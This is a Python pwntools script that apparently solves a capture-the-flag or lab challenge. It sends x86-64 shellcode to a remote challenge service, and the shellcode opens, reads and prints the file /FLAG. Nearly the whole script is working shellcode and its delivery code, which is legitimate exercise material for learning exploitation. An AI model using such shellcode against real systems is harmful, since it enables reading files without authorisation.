#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import sys


context.arch = 'amd64'
context.os = 'linux'

port = 12341
host = 'up.zoolab.org'

r = None
if 'local' in sys.argv[1:]:
    log.error("Local mode not configured for this script version.")
    sys.exit(1)
else:
    r = remote(host, port)

assembly_code = """
jmp short string_data_marker

code_logic_marker:
    pop rdi
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 2
    syscall

    mov rdi, rax
    lea rsi, [rbp + 6]
    mov rdx, 64

read:
    mov rax, 0
    syscall

    mov rdx, rax
    mov rdi, 1

    mov rax, 1
    syscall

exit_sequence:
    xor rdi, rdi
    mov rax, 60
    syscall

string_data_marker:
    call code_logic_marker
    .asciz "/FLAG"
"""

# Assemble the code using asm()
shellcode_bytes = asm(assembly_code)

prompt = r.recvuntil(b"Enter your code> ")
log.info(f"Received prompt: {prompt.decode(errors='ignore').strip()}")

# Send the assembled shellcode bytes
r.send(shellcode_bytes)

try:
    flag_output = r.recvall(timeout=2.0)
    log.success(f"Received output:\n{flag_output.decode(errors='ignore').strip()}")
except EOFError:
    log.info("EOF received. This is expected if shellcode exited correctly.")
except Exception as e:
    log.warning(f"An error occurred during recvall: {e}")
finally:
    if r and not r.closed:
        r.close()